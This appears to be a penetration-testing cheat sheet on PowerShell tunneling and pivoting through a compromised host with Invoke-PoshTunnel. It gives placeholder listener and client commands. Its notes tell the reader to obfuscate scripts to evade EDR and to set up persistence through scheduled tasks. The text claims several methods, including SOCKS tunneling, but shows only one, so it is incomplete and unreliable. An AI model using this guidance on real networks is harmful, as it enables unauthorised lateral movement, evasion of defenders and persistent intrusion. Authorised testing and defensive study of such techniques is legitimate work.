Attack Host = `<attack_ip>`, `<attack_port>`
Pivot Host = `<pivot_ip>`, `<pivot_port>`
Target Host = `<target_ip>`, `<target_port>`

In a scenario where you're attempting to tunnel or pivot from the **Attack Host** (`<attack_ip>`, `<attack_port>`) to the **Target Host** (`<target_ip>`, `<target_port>`) via a **Pivot Host** (`<pivot_ip>`, `<pivot_port>`), PowerShell offers several methods to facilitate tunneling and pivoting through the network. Below is a collection of PowerShell-based scripts and techniques that can be used for this purpose. The scripts assume you have code execution on the **Pivot Host** and want to set up the tunnel for traffic from the **Attack Host** to reach the **Target Host**.

# PowerShell - Invoke-PoshTunnel

Invoke-PoshTunnel can be used to create an HTTP-based tunnel between **Attack Host** and **Target Host** through **Pivot Host**.

1. **On the Pivot Host**, set up the listener:

```powershell
# Install Invoke-PoshTunnel from a trusted source or a script repository
Import-Module Invoke-PoshTunnel

# Set up the HTTP listener on the Pivot Host
Invoke-PoshTunnel -ListenerPort <pivot_port> -RelayPort <target_port> -TargetIP "<target_ip>"
```

2. **On the Attack Host**, you would initiate the tunnel by connecting to the **Pivot Host**.

```powershell
# Forward traffic to the Pivot Host, which will route it to the Target Host
Invoke-PoshTunnel -ProxyIP "<pivot_ip>" -ProxyPort <pivot_port>
```

This method provides an HTTP tunneling capability to route traffic through the **Pivot Host** to the **Target Host**.

# Notes
- Replace the placeholders `<attack_ip>`, `<attack_port>`, `<pivot_ip>`, `<pivot_port>`, `<target_ip>`, and `<target_port>` with the actual IP addresses and port numbers.
- Consider security controls such as firewalls and endpoint detection and response (EDR) solutions that might interfere with PowerShell-based tunneling. Always obfuscate your PowerShell scripts or use techniques to evade detection.
- For extended use, ensure persistence or utilize task scheduling techniques to re-establish the tunnel if the process is interrupted.

Each of these scripts or techniques serves a different purpose, from simple port forwarding to complex SOCKS and HTTP tunneling. Choose the one that fits your operational needs based on the environment and the complexity of your pivoting requirements.